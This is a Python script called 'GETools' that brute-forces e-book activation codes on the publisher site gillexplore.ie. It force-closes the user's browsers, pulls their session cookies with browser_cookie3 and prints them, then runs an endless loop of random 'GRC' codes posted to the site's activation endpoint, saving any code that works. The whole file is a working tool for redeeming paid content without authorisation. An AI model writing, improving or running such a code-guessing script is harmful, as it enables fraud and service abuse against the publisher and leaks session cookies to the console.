# GETools made by oauthul
import requests
import browser_cookie3
import time
import random
import string
import os
import sys
import platform


def activate_ebook(code):
    cookies = browser_cookie3.load(domain_name='gillexplore.ie')
    
    m = {
        'formID': 'ActivateEBook',
        'ActivateEBook': code
    }
    # Set up the headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'https://www.gillexplore.ie',
        'Referer': 'https://www.gillexplore.ie/dashboard',
    }
    session = requests.Session()
    
    session.cookies.update(cookies)
    # Make the request
    response = session.post(
        "https://www.gillexplore.ie/activate",
        data=m,
        headers=headers
    )
    return response

def cookeis():
        for cookie in auth_response.cookies:
            print(f"• Cookie: {cookie.name} = {cookie.value}")

def main_exec():
        try:
            if auth_response and auth_response.status_code == 200:
                print("\n✓ | Successfully accessed the page")
                if "Logout" in auth_response.text and "My Profile" in auth_response.text and "not exist" in auth_response.text:
                    print("✓ | Appears to be logged in and returned a successful e-book validation test\n")
                    cookeis()
                    input('\n- | Press ENTER to begin e-book generation ')
                    os.system('cls||clear')
                    while True:
                            def generate_code():
                                characters = string.ascii_lowercase + string.digits
                                return ''.join(random.choice(characters) for _ in range(7))
                        # Generate and return the tested code, with its status code
                            generated_code = f"GRC{generate_code()}"
                            retest = activate_ebook(f"{generated_code}")
                            # "eBook has been activated!"" is the expected return for a successful code. If this isn't returned, it's invalid.
                            if "Logout" in retest.text and 'not exist' in retest.text:
                                    print('✗ | Invalid Code\n-----------------')
                                    print(f'• Tested Code: {generated_code}')
                                    print(f'• Status Code: {retest.status_code}')
                                    time.sleep(0.5)
                                    os.system('cls||clear')
                            # When "eBook has been activated" is found, it will output the HTML data to a file so you can read which ebook was redeemed
                            elif 'Logout' in retest.text and 'eBook has been activated' in retest.text:
                                    print('✓ | Successful code found\n------------------')
                                    print(f'• Tested Code: {generated_code}')
                                    print(f'• Status Code: {retest.status_code}')
                                    time.sleep(.5)
                                    print('- | Outputting all response data to a file..')
                                    with open("success.txt", "w") as fs:
                                        fs.write(f"Successful code found, {generated_code}\n" + retest.text)
                                    print('✓ | Completed, resuming script...')
                                    time.sleep(5)
                else:
                    print("✗ | Doesn't appear to be logged in [was the input blank?]")
                    failedlog = input("✗ | Cannot run the e-book generation while logged out\n\nRestart script? y/n ")
                    if failedlog == "y":
                         os.system('cls||clear')
                         os.system('python main.py')
            else:
                failedaccess = input(f"✗ | Failed to access the page. Status code: {auth_response.status_code if auth_response else 'N/A'}\n\nRestart script? y/n ")
                if failedaccess == "y":
                     os.system('cls||clear')
                     os.system('python main.py')
        except Exception as e:
            print(f'\nException occurred: {e}')

# Main execution
print('GETools 1.0.0 by oauth\n')
print('Make sure to save your data and be logged into Gill Explore.')
time.sleep(1)
print('Starting prerequisites in 3 seconds.')
time.sleep(3)
os.system('cls||clear')

print('GETools 1.0.0 -- Prerequisites\n')
if __name__ == "__main__":
     print('✓ | Running script from main.py')
elif __name__ != "__main__":
     sys.exit("Importing the script can cause problems, try using the main file.")
if platform.system() == "Windows":
    print('✓ | Running on Windows')
elif platform.system() != "Windows":
    sys.exit(f"✗ | Incorrect OS/Architecture. This program only works on Windows for now. You are currently on {platform.system()}.")

print('- | Killing default browsers\n')
time.sleep(0.5)
kill = os.system('taskkill /f /IM chrome.exe & taskkill /f /IM firefox.exe & taskkill /f /IM opera.exe & taskkill /f /IM msedge.exe')
if kill == 128:
    print('\n- | Was closed already.')
    time.sleep(3)
    os.system('cls||clear')
    time.sleep(0.5)
elif kill == 0:
    print('\n✓ | Killed browsers.')
    time.sleep(3)
    os.system('cls||clear')
    time.sleep(0.5)

try:
    print('GETools 1.0.0 -- Validation Test\n')
    print('- | Attempting a request to "gillexplore.ie" to test validation.')
    print('- | Trying code: GRCxxxxxxx')
    auth_response = activate_ebook("GRCxxxxxxx")
    time.sleep(.5)
    main_exec()
# If the requests library had an exception, this will capture it and return it back for debugging
except requests.exceptions.RequestException as e:
    print(f"\n✗ |  An error occurred:\n{e}")
    input('\n✗ | Check if you can access www.gillexplore.ie on a browser')
